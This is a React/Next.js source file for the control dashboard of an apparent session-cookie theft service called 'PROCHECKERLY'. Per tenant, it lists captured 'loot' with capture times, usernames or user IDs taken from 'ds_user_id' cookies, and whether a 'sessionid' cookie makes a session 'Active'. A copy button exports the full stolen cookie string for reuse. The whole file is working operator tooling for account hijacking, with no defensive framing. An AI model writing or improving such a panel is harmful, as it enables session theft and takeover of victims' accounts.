"use client";
import { useEffect, useState, useCallback } from "react";
import { createBrowserClient } from "@supabase/ssr";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import { PurgeButton } from "@/components/PurgeButton";
import { LogOut } from "lucide-react";
import { getRemoteLoot, logout } from "./actions";

export default function AdminDashboard() {
  const [loot, setLoot] = useState<any[]>([]);
  const [profile, setProfile] = useState<{ tenant_id: string } | null>(null);

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
  );

  const fetchData = useCallback(async () => {
    try {
      let currentTenant = profile?.tenant_id;

      // 1. Resolve Identity: Check Metadata first, then DB Profile
      if (!currentTenant) {
        const {
          data: { user },
        } = await supabase.auth.getUser();
        if (!user) return;

        // Try metadata (set during registration)
        const metadataTenant = user.user_metadata?.tenant_id;

        // Try database profile
        const { data: profileData } = await supabase
          .from("profiles")
          .select("tenant_id")
          .single();

        currentTenant = metadataTenant || profileData?.tenant_id;

        if (currentTenant) {
          setProfile({ tenant_id: currentTenant });
        }
      }

      // 2. Fetch Loot using the Server Action
      if (currentTenant) {
        const data = await getRemoteLoot(currentTenant);
        setLoot(Array.isArray(data) ? [...data].reverse() : []);
      }
    } catch (err) {
      console.error("Dashboard Sync Error:", err);
    }
  }, [profile?.tenant_id, supabase]);

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, [fetchData]);

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-mono p-12">
      <header className="flex justify-between items-center mb-16 max-w-6xl mx-auto">
        <div>
          <h1 className="text-white text-xl font-bold tracking-tighter">
            PROCHECKERLY{" "}
            <span className="text-zinc-600 font-light">/ Control</span>
          </h1>
          <p className="text-[9px] uppercase tracking-[0.3em] text-blue-900 mt-1 font-bold">
            NODE: {profile?.tenant_id || "INITIALIZING..."}
          </p>
        </div>

        <div className="flex items-center gap-4">
          <PurgeButton onPurge={fetchData} />
          <button
            onClick={() => logout()}
            className="flex items-center gap-2 px-4 py-2 bg-zinc-900 hover:bg-red-950/20 text-zinc-500 hover:text-red-500 border border-zinc-800 rounded transition-all text-[10px] uppercase font-bold tracking-widest">
            <LogOut size={12} />
            Disconnect
          </button>
        </div>
      </header>

      <main className="max-w-6xl mx-auto">
        <div className="rounded-lg border border-zinc-900 bg-zinc-900/10 overflow-hidden">
          <table className="w-full text-left text-xs">
            <thead className="border-b border-zinc-900 bg-zinc-900/20 text-zinc-600">
              <tr>
                <th className="px-6 py-4 uppercase tracking-widest text-[9px]">
                  Captured At
                </th>
                <th className="px-6 py-4 uppercase tracking-widest text-[9px]">
                  User Identity
                </th>
                <th className="px-6 py-4 uppercase tracking-widest text-[9px]">
                  Session Status
                </th>
                <th className="px-6 py-4 text-right"></th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-900/50">
              <AnimatePresence mode="popLayout">
                {loot.map((item, i) => (
                  <motion.tr
                    key={i}
                    layout
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="group hover:bg-white/[0.01]">
                    <td className="px-6 py-5 text-zinc-700 tabular-nums">
                      {item.timestamp}
                    </td>
                    <td className="px-6 py-5">
                      <span className="text-white font-bold text-sm">
                        {item.username
                          ? `@${item.username}`
                          : `UID:${item.data.find((s: string) => s.includes("ds_user_id"))?.split("=")[1] || "???"}`}
                      </span>
                    </td>
                    <td className="px-6 py-5 uppercase text-[9px] font-bold">
                      {item.data.some((s: string) =>
                        s.includes("sessionid"),
                      ) ? (
                        <div className="flex items-center gap-2 text-blue-500">
                          <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse shadow-[0_0_8px_#3b82f6]" />
                          Active
                        </div>
                      ) : (
                        <span className="text-zinc-800">Partial</span>
                      )}
                    </td>
                    <td className="px-6 py-5 text-right">
                      <CopyButton data={item.data.join("; ")} />
                    </td>
                  </motion.tr>
                ))}
              </AnimatePresence>
            </tbody>
          </table>

          {loot.length === 0 && (
            <div className="py-24 text-center text-zinc-800 text-[10px] uppercase tracking-[0.5em]">
              Waiting for incoming data stream...
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
